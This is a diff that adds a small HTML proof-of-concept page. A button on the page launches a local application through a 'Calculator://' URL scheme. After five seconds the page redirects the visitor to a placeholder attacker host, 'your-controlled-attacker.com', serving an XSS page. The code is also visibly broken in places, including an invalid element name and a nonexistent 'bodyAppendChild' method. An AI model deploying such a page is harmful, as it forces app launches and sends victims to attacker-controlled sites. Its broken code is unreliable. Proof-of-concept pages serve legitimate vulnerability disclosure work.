@@ -1,2 +1,24 @@
-.
+<html>
+    <body>
+        <button type="button" onclick="openURL()">Click this button</button>
+    </body>
+    <script>
+        function createInstance()
+        {
+            let a = document.createElement('href');
+            a.href = window.open("Calculator://");
+            document.bodyAppendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        function openURL()
+        {
+            createInstance();
+        }
+
+        setTimeout(function(){
+            window.location.href = "https://your-controlled-attacker.com/poc/xss.html";
+        }, 5000);
+    </script>
+</html>
 
